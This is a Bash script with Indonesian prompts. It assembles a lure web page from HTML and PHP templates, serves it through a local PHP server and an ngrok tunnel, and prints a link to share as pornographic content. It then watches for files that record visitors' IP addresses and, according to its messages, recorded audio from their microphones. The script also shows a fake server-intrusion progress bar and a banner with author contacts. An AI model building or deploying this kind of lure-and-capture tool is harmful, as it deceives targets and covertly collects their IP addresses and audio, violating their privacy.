#!/bin/bash
akugans(){
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Menuggu targets,\e[0m\e[1;77m tekan Ctrl + C untuk kaluar...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target open Bokep!\n"
aku
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Suara Desah telah direkam!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}
aku(){
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt
}
pembuka(){
    printf "\033[33;1mpress enter untuk\033[31;1m lanjut..........!"
    read
    printf "\033[31;1mselamat datang,\033[33;1msiapa \033[32;1mnama kaka?"
    read nama
    printf "\033[32;1m--=[\033[33;1m+\033[32;1m]\033[37;1mSelamat Datang $nama Tukang Coli:V\033[32;1m[\033[33;1m+\033[32;1m]=--"
    printf '\n'
}
hedy(){
    website_template='hedywibi.html'
    cat $website_template > index.php
    cat template.php >> index.php
}

ngrok(){
    printf "\e[1;92m[\e[0m+\e[1;92m]\033[35;1mStart php server su\033[31;1m(\033[33;1mHostpotnya \033[36;1mHidupin su!!\033[31;1m)_\e[0m\e[1;77m(localhost\033[33;1m:3333)\e[0m\e[1;92m...\e[0m\n"
    php -S 0.0.0.0:3333 > /dev/null 2>&1 &
    sleep 2
    printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m]\033[35;1mStart ngrok server su\033[31;1m(\033[33;1mHotspot \033[36;1midupin\033[31;1m)_\e[0m\e[1;77m(http\033[33;1m3333)\e[0m\e[1;92m...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 10

    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

    printf "\e[1;92m[\e[0m+\e[1;92m] Share bokep\e[0m\e[1;77mNekopoi\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link
    
}
 

load(){
# 1. Create ProgressBar function
# 1.1 Input is currentState($1) and totalState($2)
function ProgressBar {
# Process data
    let _progress=(${1}*100/${2}*100)/100
    let _done=(${_progress}*4)/10
    let _left=40-$_done
# Build progressbar string lengths
    _fill=$(printf "%${_done}s")
    _empty=$(printf "%${_left}s")

# 1.2 Build progressbar strings and print the ProgressBar line
# 1.2.1 Output example:                           
# 1.2.1.1 Progress : [########################################] 100%
printf "\rMencoba Masuk KeServer!!:[${_fill// /\#}${_empty// /-}] ${_progress}%%"

}

# Variables
_start=1

# This accounts as the "totalState" variable for the ProgressBar function
_end=100

# Proof of concept
for number in $(seq ${_start} ${_end})
do
    sleep 0.1
    ProgressBar ${number} ${_end}
done
printf '\nMasuk ke server!\n'
}

banner(){
printf '\n'
printf "\033[32;1m___________.__ __                    \033[34;1m__________                      __                 "
printf '\n'
printf "\033[32;1m\__    ___/|__|  | ____ __  ______  \033[34;1m \______   \ ___________   _____/  |______    ______"
printf '\n'
printf "\033[33;1m  |    |   |  |  |/ /  |  \/  ___/  \033[34;1m |     ___// __ \_  __ \_/ __ \   __\__  \  /  ___/"
printf '\n'
printf "\033[33;1m  |    |   |  |    <|  |  /\___ \   \033[35;1m |    |   \  ___/|  | \/\  ___/|  |  / __ \_\___ \ "
printf '\n'
printf "\033[33;1m  |____|   |__|__|_ \____//______>_  \033[35;1m|____|    \_____>__|    \_____>__| (____  /____  >"
printf '\n'
printf "\033[33;1m                    \/          \/   \033[31;1m               \/            \/          \/     \/  "

printf '\n'
sleep 4
printf "\033[31;1m                     .:| Author:\033[37;1mWhoMHw \033[31;1m|:. "
printf '\n'
printf "\033[34;1m                     .:| Telegram:\033[37;1mHedy2\033[34;1m|:.    "
printf '\n'
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mYoutubme:https://www.youtube.com/channel/UChMIkGetnMB4qq9K5kNwkXA/featured"
printf '\n'
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mGithub:https://github.com/WhoMHw"
printf '\n'
sleep 0.07
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mGithub:https://github.com/WongBiasa"
printf '\n'
sleep 0.03
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mInstagram:https://www.instagram.com/wong_biasa0723/"
printf "\n"
sleep 0.03
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mInstagram:https://www.instagram.com/siapa_namasaya23/"
printf '\n'
sleep 3
}

pembuka
load
banner
hedy
ngrok
akugans